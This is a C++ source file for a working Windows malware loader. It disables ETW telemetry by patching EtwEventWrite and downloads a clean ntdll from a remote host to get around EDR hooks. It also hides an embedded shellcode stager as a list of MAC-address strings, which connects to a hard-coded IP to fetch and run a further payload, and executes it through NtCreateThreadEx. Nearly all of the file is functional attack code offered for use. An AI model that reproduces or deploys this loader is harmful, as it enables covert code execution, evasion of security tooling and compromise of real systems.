/* 

1) Use on another DLL 
2) Change Syscalls available
3) Remove ETW patch + Check hook
4) Retrieve shellcode instead of in source

*/



#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include <vector>
#include <psapi.h>
#include <winhttp.h>
#include <winternl.h>
#include <Ip2string.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "winhttp")

#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


struct DLL {

    LPVOID ntdll;
    DWORD size;

};


typedef NTSTATUS (*_NtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS (*_NtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);



typedef NTSTATUS (*_NtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

typedef NTSTATUS (*_NtWaitForSingleObject)(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);

BOOL DisableETW(void) {
    DWORD oldprotect = 0;

    char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
    char sntdll[] = { 'n','t','d','l','l', 0 };

    //      xor rax, rax; 
    //      ret
    char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };


    void* addr = GetProcAddress(GetModuleHandleA(sntdll), sEtwEventWrite);
    if (!addr) {
        printf("Failed to get EtwEventWrite Addr (%u)\n", GetLastError());
        return FALSE;
    }
    BOOL status1 = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status1) {
        printf("Failed in changing protection (%u)\n", GetLastError());
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));


    BOOL status2 = VirtualProtect(addr, 4096, oldprotect, &oldprotect);

    if (!status2) {
        printf("Failed in changing protection back (%u)\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}




DLL GetNtdll(wchar_t* whost, DWORD port, wchar_t* wresource) {
    struct DLL dll;
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {


                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                    // Unhook NTDLL;
                    //Unhook((LPVOID)pszOutBuffer);

                }
                delete[] pszOutBuffer;

            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();

        char* ntdll = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            ntdll[i] = PEbuf[i];
        }
        dll.ntdll = ntdll;
        dll.size = size;
        return dll;
}






BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    if (memcmp(addr, stub, 4) != 0)
        return TRUE;
    return FALSE;
}

PVOID BaseAddress = NULL;
SIZE_T dwSize = 0x2000;


HANDLE hThread;
DWORD OldProtect = 0;



HANDLE hHostThread = INVALID_HANDLE_VALUE;





int main(int argc, char** argv) {

    // Validate the parameters
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }

    //printf("[+] Patching ETW \n");
    if (!DisableETW()) {
        printf("Failed in patching ETW\n");
        return -3;
    }
    //printf("[+] ETW Patched !!\n");


    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];

    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);


    const size_t cSize2 = strlen(resource) + 1;
    wchar_t* wresource = new wchar_t[cSize2];
    mbstowcs(wresource, resource, cSize2);

    DLL ntdll = GetNtdll(whost, port, wresource);
    printf("\n[+] Got %s from %s:%d\n\n", resource, host, port);

    char* dllBytes = (char*)malloc(ntdll.size);
    memcpy(dllBytes, ntdll.ntdll, ntdll.size);


    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

    SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

    LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);

    //load sections into memory
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {

        LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
        LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
        CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);

        SECTION_HEADER++;
    }

    // Copy IAT to memory

    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "";
    while (IMPORT_DATA->Name != NULL) {

        ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)alloc_mem;
        IMAGE_THUNK_DATA* firstThunk;
        HMODULE hmodule = LoadLibraryA(ModuleName);
        if (hmodule) {
            firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);
            for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++) {

                DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;
                LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 
                *(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
            }
        }
        IMPORT_DATA++;
    }

    // Copy EAT to memory

    IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
    DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
    WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);

    DWORD* addrNames1 = addrNames;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
		char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);

        //printf("%p\n", ((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]));
		
        if (strstr(name, NtAllocateVirtualMemorytxt) != NULL) {
			pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
			break;
		}
        
	}

    DWORD OldProtect = 0;
    VirtualProtect(alloc_mem, ntdll.size, PAGE_EXECUTE_READ, &OldProtect);

    printf("[+] Mapped ntdll @ %p\n", alloc_mem);
    
	if (pNtAllocateVirtualMemory) {
        NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            printf("[!] Failed in sysZwAllocateVirtualMemory (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtAll0catedV1rtualMem0ry @ %p\n", pNtAllocateVirtualMemory);
        printf("[+] NtAll0catedV1rtualMem0ry Executed !!!\n");
	}
 
    
    const char* MAC[] =
    {
        "FC-48-83-E4-F0-E8",
        "CC-00-00-00-41-51",
        "41-50-52-51-56-48",
        "31-D2-65-48-8B-52",
        "60-48-8B-52-18-48",
        "8B-52-20-48-0F-B7",
        "4A-4A-48-8B-72-50",
        "4D-31-C9-48-31-C0",
        "AC-3C-61-7C-02-2C",
        "20-41-C1-C9-0D-41",
        "01-C1-E2-ED-52-48",
        "8B-52-20-8B-42-3C",
        "41-51-48-01-D0-66",
        "81-78-18-0B-02-0F",
        "85-72-00-00-00-8B",
        "80-88-00-00-00-48",
        "85-C0-74-67-48-01",
        "D0-50-8B-48-18-44",
        "8B-40-20-49-01-D0",
        "E3-56-4D-31-C9-48",
        "FF-C9-41-8B-34-88",
        "48-01-D6-48-31-C0",
        "AC-41-C1-C9-0D-41",
        "01-C1-38-E0-75-F1",
        "4C-03-4C-24-08-45",
        "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0",
        "66-41-8B-0C-48-44",
        "8B-40-1C-49-01-D0",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-48-8B-12-E9",
        "4B-FF-FF-FF-5D-48",
        "31-DB-53-49-BE-77",
        "69-6E-69-6E-65-74",
        "00-41-56-48-89-E1",
        "49-C7-C2-4C-77-26",
        "07-FF-D5-53-53-48",
        "89-E1-53-5A-4D-31",
        "C0-4D-31-C9-53-53",
        "49-BA-3A-56-79-A7",
        "00-00-00-00-FF-D5",
        "E8-0D-00-00-00-31",
        "39-32-2E-31-36-38",
        "2E-31-2E-31-33-00",
        "5A-48-89-C1-49-C7",
        "C0-78-E6-00-00-4D",
        "31-C9-53-53-6A-03",
        "53-49-BA-57-89-9F",
        "C6-00-00-00-00-FF",
        "D5-E8-7F-00-00-00",
        "2F-2D-7A-30-6C-69",
        "69-63-32-69-55-31",
        "74-6D-57-79-62-43",
        "53-5A-42-74-51-53",
        "39-6A-53-4F-4C-56",
        "37-73-61-47-43-6E",
        "73-56-79-67-4F-71",
        "51-35-77-6F-67-6B",
        "68-50-58-78-77-4E",
        "36-52-71-76-51-7A",
        "58-43-68-6D-36-6C",
        "6C-46-78-5F-71-43",
        "4D-65-55-78-59-6B",
        "64-6A-48-58-4B-34",
        "58-53-48-6B-4D-61",
        "4A-4B-51-30-35-6A",
        "4C-51-38-6D-6D-4D",
        "76-70-48-4D-79-2D",
        "63-4E-78-71-6D-43",
        "76-45-6C-49-78-77",
        "66-6E-67-58-4B-6A",
        "00-48-89-C1-53-5A",
        "41-58-4D-31-C9-53",
        "48-B8-00-32-A8-84",
        "00-00-00-00-50-53",
        "53-49-C7-C2-EB-55",
        "2E-3B-FF-D5-48-89",
        "C6-6A-0A-5F-48-89",
        "F1-6A-1F-5A-52-68",
        "80-33-00-00-49-89",
        "E0-6A-04-41-59-49",
        "BA-75-46-9E-86-00",
        "00-00-00-FF-D5-4D",
        "31-C0-53-5A-48-89",
        "F1-4D-31-C9-4D-31",
        "C9-53-53-49-C7-C2",
        "2D-06-18-7B-FF-D5",
        "85-C0-75-1F-48-C7",
        "C1-88-13-00-00-49",
        "BA-44-F0-35-E0-00",
        "00-00-00-FF-D5-48",
        "FF-CF-74-02-EB-AA",
        "E8-55-00-00-00-53",
        "59-6A-40-5A-49-89",
        "D1-C1-E2-10-49-C7",
        "C0-00-10-00-00-49",
        "BA-58-A4-53-E5-00",
        "00-00-00-FF-D5-48",
        "93-53-53-48-89-E7",
        "48-89-F1-48-89-DA",
        "49-C7-C0-00-20-00",
        "00-49-89-F9-49-BA",
        "12-96-89-E2-00-00",
        "00-00-FF-D5-48-83",
        "C4-20-85-C0-74-B2",
        "66-8B-07-48-01-C3",
        "85-C0-75-D2-58-C3",
        "58-6A-00-59-49-C7",
        "C2-F0-B5-A2-56-FF",
        "D5-90-90-90-90-90"
    };
    


    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    for (int i = 0; i < rowLen; i++) {
        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            return FALSE;
        }
        ptr += 6;

    }

   

    DWORD* addrNames2 = addrNames;
    _NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);

        if (strstr(name, NtProtectVirtualMemorytxt) != NULL) {
            pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

   
    if (pNtProtectVirtualMemory) {
        NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(status2)) {
            printf("[!] Failed in NtPr0tectV1rtualM3mory (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtPr0tectV1rtualMem0ry @ %p\n", pNtProtectVirtualMemory);
        printf("[+] NtPr0tectV1rtualMem0ry Executed !!!\n");
    }

   
    DWORD* addrNames3 = addrNames;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;
    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);

        if (strstr(name, NtCreateThreadExtxt) != NULL) {
            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

   

    if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            printf("[!] Failed in NtCr3at3Thr3adEx (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtCr3at3Thr3adEx @ %p\n", pNtCreateThreadEx);
        printf("[+] NtCr3at3Thr3adEx Executed !!!\n");
    }
    
    
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
   
    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in NtWa1tF0rS1ngle0bj3ct (%u)\n", GetLastError());
        return 4;
    }
    printf("\n[+] NtWa1tF0rS1ngle0bj3ct Executed !!!\n");
    printf("\n\n[+] Finished !!!!\n");

    VirtualProtect(alloc_mem, ntdll.size, PAGE_READONLY, &OldProtect);


    return 0;

}
